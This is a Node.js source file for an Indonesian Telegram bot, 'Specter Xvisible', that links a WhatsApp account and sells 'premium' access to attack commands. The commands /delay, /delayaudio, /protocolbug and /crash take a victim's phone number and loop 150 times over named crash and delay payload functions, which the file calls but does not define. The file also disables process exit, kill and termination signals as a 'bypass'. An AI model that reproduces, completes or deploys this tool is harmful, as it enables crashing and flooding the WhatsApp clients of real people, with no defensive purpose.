const axios = require("axios");
const chalk = require("chalk");
function requestInterceptor(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
      chalk.blue(`
██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░
██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗
██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝
╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░
███╗░░░███╗░█████╗░██████╗░██╗░░██╗███████╗██╗░░░██╗
████╗░████║██╔══██╗██╔══██╗██║░░██║╚════██║╚██╗░██╔╝
██╔████╔██║██║░░██║██║░░██║███████║░░███╔═╝░╚████╔╝░
██║╚██╔╝██║██║░░██║██║░░██║██╔══██║██╔══╝░░░░╚██╔╝░░
██║░╚═╝░██║╚█████╔╝██████╔╝██║░░██║███████╗░░░██║░░░
╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░`) +
        chalk.green("\n]|• 𝙶𝙸𝚃𝙷𝚄𝙱 𝚁𝙰𝚆 ::" + urlTarget)
    );
  }
  return cfg;
}
function errorInterceptor(error) {
  const nihUrlKlwError = error?.config?.url || "URL TIDAK DIKETAHUI";
  console.error(
    chalk.green("𝗙𝗔𝗜𝗟𝗘𝗗 𝗧𝗢 𝗔𝗖𝗖𝗘𝗦𝗦: " + nihUrlKlwError)
  );
  return Promise.reject(error);
}
axios.interceptors.request.use(requestInterceptor, errorInterceptor);
const originalExit = process.exit;
process.exit = new Proxy(originalExit, {
  apply(target, thisArg, argumentsList) {
    console.log(chalk.blue("BYPASS TELAH AKTIF"));
  },
});
const originalKill = process.kill;
process.kill = function (pid, signal) {
  if (pid === process.pid) {
    console.log(chalk.blue("BYPASS TELAH AKTIF"));
  } else {
    return originalKill(pid, signal);
  }
};
["SIGINT", "SIGTERM", "SIGHUP"].forEach((signal) => {
  process.on(signal, () => {
    console.log(chalk.red("SINYAL " + signal + " TERDETEKSI DAN DIABAIKAN"));
  });
});
function vvvvvvv2(cfg) {
  const urlTarget = cfg.url;
  const domainGithub = [
    "github.com",
    "raw.githubusercontent.com",
    "api.github.com",
  ];
  const isGitUrl = domainGithub.some((domain) => urlTarget.includes(domain));
  if (isGitUrl) {
    console.warn(
     chalk.green("\n ]|• 𝙶𝙸𝚃𝙷𝚄𝙱 𝚁𝙰𝚆 ::" + urlTarget)
    );
  }
  return cfg;
}
function startProgressBar() {
    const progressSteps = [
        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■■■□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■■■□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■■■□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■■■□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■■■□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■■■□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■■■□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■■■□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■■■□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■■■□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■■■□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■■■□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■■■□□□□□□□□□□□□□□□□□□□□□□□□□□]",
        "[■□□□□□□□□□□□□□□□□□□□□□□□□□□□□]",
    ];
    const colors = [
        chalk.redBright,
        chalk.yellowBright,
        chalk.greenBright,
        chalk.cyanBright,
        chalk.blueBright,
        chalk.magentaBright,
        chalk.whiteBright,
    ];
    let step = 0;
    let colorIndex = 0;
    setInterval(() => {
        console.clear();
        console.log(chalk.cyanBright(`
██████╗░██╗░░░██╗██████╗░░█████╗░░██████╗░██████╗
██╔══██╗╚██╗░██╔╝██╔══██╗██╔══██╗██╔════╝██╔════╝
██████╦╝░╚████╔╝░██████╔╝███████║╚█████╗░╚█████╗░
██╔══██╗░░╚██╔╝░░██╔═══╝░██╔══██║░╚═══██╗░╚═══██╗
██████╦╝░░░██║░░░██║░░░░░██║░░██║██████╔╝██████╔╝
╚═════╝░░░░╚═╝░░░╚═╝░░░░░╚═╝░░╚═╝╚═════╝░╚═════╝░
███╗░░░███╗░█████╗░██████╗░██╗░░██╗███████╗██╗░░░██╗
████╗░████║██╔══██╗██╔══██╗██║░░██║╚════██║╚██╗░██╔╝
██╔████╔██║██║░░██║██║░░██║███████║░░███╔═╝░╚████╔╝░
██║╚██╔╝██║██║░░██║██║░░██║██╔══██║██╔══╝░░░░╚██╔╝░░
██║░╚═╝░██║╚█████╔╝██████╔╝██║░░██║███████╗░░░██║░░░
╚═╝░░░░░╚═╝░╚════╝░╚═════╝░╚═╝░░╚═╝╚══════╝░░░╚═╝░░░`));
       axios.interceptors.request.use(vvvvvvv2, errorInterceptor);
        const color = colors[colorIndex % colors.length];
        console.log(color.bold(progressSteps[step]));
        
        step = (step + 1) % progressSteps.length;
        colorIndex++;
    }, 200);
}
startProgressBar();
const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config");
const crypto = require("crypto");
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));
// === Path File ===
const premiumFile = "./datebase/premiums.json";

// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

// === Load Semua Data Saat Startup ===
let premiumUsers = loadJSON(premiumFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗Mohon Maaf Fitur Ini Khusus Owner");
  }

  return next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

// === Fungsi  Premium ===

const addPremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};
bot.use(session());

let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
const usePairingCode = true;
///////// RANDOM IMAGE JIR \\\\\\\
const randomImages = [
"https://files.catbox.moe/bqpwlf.jpeg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);

  return `${hours}h ${minutes}m ${seconds}s`;
};

const question = (query) =>
  new Promise((resolve) => {
    const rl = require("readline").createInterface({
      input: process.stdin,
      output: process.stdout,
    });
    rl.question(query, (answer) => {
      rl.close();
      resolve(answer);
    });
  });

//////// FUNGSI VALID TOKEN \\\\\\\\\
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Rexzy177/repo/refs/heads/main/repo.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens || [];
  } catch (error) {
    console.error(chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));

  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token Anda Tidak Valid, Bot Otomotis Di Matikan"));
    process.exit(1);
  }

  console.log(chalk.green("✅ Token Anda Terdaftar Di Database"));
  startBot(); 
}

function startBot() {
 console.clear();
  console.log(
    chalk.red(`Token Valid, Bot Succesfully Ready
`));
}

validateToken();
///// --- Koneksi WhatsApp --- \\\\\
const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState("./session");
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }), // Log level diubah ke "info"
    auth: state,
    browser: ["Mac OS", "Safari", "10.15.7"],
  };

  sock = makeWASocket(connectionOptions);

  sock.ev.on("creds.update", saveCreds);
  

  sock.ev.on("connection.update", (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "open") {
      isWhatsAppConnected = true;
      console.log(
        chalk.white.bold(`

  ${chalk.green.bold("WHATSAPP SUDAH TERHUBUNG")}
`)
      );
    }

    if (connection === "close") {
      const shouldReconnect =
        lastDisconnect?.error?.output?.statusCode !==
        DisconnectReason.loggedOut;
      console.log(
        chalk.white.bold(`
 ${chalk.red.bold("WHATSAPP TERPUTUS")}
`),
        shouldReconnect
          ? chalk.white.bold(`
 ${chalk.red.bold("HUBUNGKAN ULANG")}
`)
          : ""
      );
      if (shouldReconnect) {
        startSesi();
      }
      isWhatsAppConnected = false;
    }
  });
};


////=== Fungsi Delete Session ===\\\\\\\
function deleteSession() {
  if (fs.existsSync(sessionPath)) {
    const stat = fs.statSync(sessionPath);

    if (stat.isDirectory()) {
      fs.readdirSync(sessionPath).forEach(file => {
        fs.unlinkSync(path.join(sessionPath, file));
      });
      fs.rmdirSync(sessionPath);
      console.log('Folder session berhasil dihapus.');
    } else {
      fs.unlinkSync(sessionPath);
      console.log('File session berhasil dihapus.');
    }

    return true;
  } else {
    console.log('Session tidak ditemukan.');
    return false;
  }
}

bot.command(/\/setjeda (\d+[smh])/, (msg, match) => { 
const chatId = msg.chat.id; 
const response = setCooldown(match[1]);

bot.sendMessage(chatId, response); });
////=========MENU UTAMA========\\\\
bot.start(async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung";

  const mainMenuMessage = `\`\`\`
╭──( ɪɴғᴏʀᴍᴀsɪᴏɴ ʙᴏᴛ )
│◇ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @AlwaysRezi
│◇ ɴᴀᴍᴇ ʙᴏᴛ : Specter Xvisible
│◇ ᴠᴇʀsɪᴏɴ : 1.0
│◇ ʀᴜɴᴛɪᴍᴇ : ${waktuRunPanel}
╰─────────────────────
╭─( ɪɴғᴏʀᴍᴀsɪᴏɴ ᴜsᴇʀ )
│◇ ᴜsᴇʀ : ${Name}
│◇ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "Ya" : "Tidak"}
│◇ ᴜsᴇʀ ɪᴅ : ${userId}
╰─────────────────────
\`\`\`
`;

  const mainKeyboard = [
    [
      {
        text: "Bug Menu",
        callback_data: "bug_menu",
      },
      {
        text: "Owner Menu",
        callback_data: "owner_menu",
      },
    ],
    [
      {
        text: "Developer",
        url: "https://t.me/AlwasyRezi",
      },
    ],
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: mainKeyboard,
    },
  });
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung";
      
      const mainMenuMessage = `\`\`\`
╭─( ɪɴғᴏʀᴍᴀsɪᴏɴ ᴜsᴇʀ )
│◇ ᴜsᴇʀ : ${Name}
│◇ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "Ya" : "Tidak"}
│◇ ᴜsᴇʀ ɪᴅ : ${userId}
╰─────────────────────
╭─( ᴏᴡɴᴇʀ ᴍᴇɴᴜ )
│◇ /addprem <ɪᴅ>
│◇ /delprem <ɪᴅ>
│◇ /cekprem
│◇ /delsesion
│◇ /connect 62××
╰─────────────────────
\`\`\`
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "ʙᴀᴄᴋ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung";
      
  const mainMenuMessage = `\`\`\`
╭─( ɪɴғᴏʀᴍᴀsɪᴏɴ ᴜsᴇʀ )
│◇ ᴜsᴇʀ : ${Name}
│◇ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "Ya" : "Tidak"}
│◇ ᴜsᴇʀ ɪᴅ : ${userId}
╰─────────────────────
╭─( ʙᴜɢ ᴍᴇɴᴜ )
│◇ /delay 62××
│◇ /delayaudio 62××
│◇ /protocolbug 62××
│◇ /crash 62××
╰─────────────────────
\`\`\`
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "ʙᴀᴄᴋ", callback_data: "back" }],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler untuk back main menu
bot.action("back", async (ctx) => {
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);
  const Name = ctx.from.username ? `@${ctx.from.username}` : userId;
  const waktuRunPanel = getUptime();
  const waStatus = sock && sock.user
      ? "Terhubung"
      : "Tidak Terhubung"; 
      
  const mainMenuMessage = `\`\`\`
╭──( ɪɴғᴏʀᴍᴀsɪᴏɴ ʙᴏᴛ )
│◇ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @AlwaysRezi
│◇ ɴᴀᴍᴇ ʙᴏᴛ : Specter Xvisible
│◇ ᴠᴇʀsɪᴏɴ : 1.0
│◇ ʀᴜɴᴛɪᴍᴇ : ${waktuRunPanel}
╰─────────────────────
╭─( ɪɴғᴏʀᴍᴀsɪᴏɴ ᴜsᴇʀ )
│◇ ᴜsᴇʀ : ${Name}
│◇ ᴘʀᴇᴍɪᴜᴍ : ${isPremium ? "Ya" : "Tidak"}
│◇ ᴜsᴇʀ ɪᴅ : ${userId}
╰─────────────────────
\`\`\`
`;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const mainKeyboard = [
    [
      {
        text: "Bug Menu",
        callback_data: "bug_menu",
      },
      {
        text: "Owner Menu",
        callback_data: "owner_menu",
      },
    ],
    [
      {
        text: "Developer",
        url: "https://t.me/AlwaysRezi",
      },
    ],
  ];

  try {
    await ctx.editMessageMedia(media, { reply_markup: { inline_keyboard: mainKeyboard } });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: { inline_keyboard: mainKeyboard },
    });
  }
});
////////// OWNER MENU \\\\\\\\\
const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("Hubungkan Whatsapp Anda. Contoh /connect <Nomor>");
    return;
  }
  next();
};
//////// -- CASE BUG --- \\\\\\\\\\\
bot.command("delay", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delay 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/bqpwlf.jpeg", {
    caption: `
\`\`\`
-# Success Sending Bug
Target : ${q}
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      await bulldozer1GB(target);
      await protocolbug7(target, true);
      await BlackDelayCrash(target, true);
      await RyuApiDelay(target, true);
      await zenninvisfc(target, true);
      await zenndelayinvisiXo(target);
      await ZennDelaySsuper(target, true);
      await InvisHard(target, true);
      await VampBroadcast(target, true);
      await btnStatus(target, true);
      await sleep(1000);
    }
  })();
});
bot.command("delayaudio", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /delayaudio 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/bqpwlf.jpeg", {
    caption: `
\`\`\`
-# Success Sending Bug
Target : ${q}
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      await protocolbug7(target, true);
      await protocolbug7(target, true);
      await protocolbug7(target, true);
      await protocolbug7(target, true);
      await protocolbug7(target, true);
      await protocolbug7(target, true);
      await xPro(target, true);
      await xPro(target, true);
      await xPro(target, true);
      await bulldozer1GB(target);
      await stunnerBugMP4(target);
      await stunnerBugMP4(target);
      await sleep(1000);
    }
  })();
});
bot.command("protocolbug", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /protocolbug 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/bqpwlf.jpeg", {
    caption: `
\`\`\`
-# Success Sending Bug
Target : ${q}
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      await protocolbug7(target, true);
      await protocolbug6(target, true);
      await protocolbug5(target, true);
      await protocolbug4(target, true);
      await protocolbug3(target, true);
      await protocolbug7(target, true);
      await DevilsProtocolV2(target, true);
      await bulldozer1GB(target);
      await sleep(1000);
    }
  })();
});
bot.command("crash", checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`Example: /crash 62xxxx`);
  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.sendPhoto("https://files.catbox.moe/bqpwlf.jpeg", {
    caption: `
\`\`\`
-# Success Sending Bug
Target : ${q}
\`\`\`
`,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [[{ text: "Cek Target", url: `https://wa.me/${q}` }]],
    },
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      await VampSpamFc(target);
      await VampireSpamNotif(target, Ptcp = true);
      await VampireNewUi(target, Ptcp = true);
      await CursorCrazyV4(target);
      await CursorCrazy(target);
      await forclase(target);
      await VztZapCrash(target);
      await sleep(2000);
    }
  })();
});
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addprem", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" "); 

  if (args.length < 2) {
    return ctx.reply("⚠️ Format Salah!. Example : /addprem 12345678");
  }

  const userId = args[1].toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki akses premium.`);
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang adalah premium.`);
});
bot.command("delprem", checkOwner, (ctx) => {
  const args = ctx.message.text.trim().split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "⚠️ Format Salah!. Example : /delprem 12345678"
    );
  }

  const userId = args[1].toString();

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`⚠️ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`⚠️ Pengguna ${userId} telah dihapus dari akses premium.`);
});

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();

  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`⚠️ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
// Command pairing
bot.command("connect", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return await ctx.reply("⚠️ Format Salah!. Example : /connect <nomor_wa>");
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Whatsapp Sudah Terhubung");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "123SPCTR");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
\`\`\`
╭────────────────────
│▢ Nomor : ${phoneNumber}
│▢ Code : ${formattedCode}
╰────────────────────
\`\`\`
`,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [[{ text: "Hapus", callback_data: "close" }]],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply("⚠️ Gagal melakukan pairing !");
  }
});
// Handler untuk tombol close
bot.action("close", async (ctx) => {
  const userId = ctx.from.id.toString();

  if (!OWNER_IDS.includes(userId)) {
    return ctx.answerCbQuery("Lu Siapa Kontol", { show_alert: true });
  }

  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
    await ctx.answerCbQuery("⚠️ Gagal menghapus pesan!", { show_alert: true });
  }
});
///=== comand del sesi ===\\\\
bot.command("delsesion", (ctx) => {
  const success = deleteSession();

  if (success) {
    ctx.reply("Session berhasil di hapus, silahkan connect ulang");
  } else {
    ctx.reply("Tidak ada session yang tersimpan saat ini.");
  }
});


///////////////////[FUNC]////////////////

// --- Jalankan Bot ---

(async () => {
  console.clear();
  console.log("🚀 Memulai sesi WhatsApp...");
  startSesi();

  console.log("Sukses connected");
  bot.launch();

  // Membersihkan konsol sebelum menampilkan pesan sukses
  console.clear();
  console.log(
    chalk.bold.white(`\n

⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀`)
  );
})();
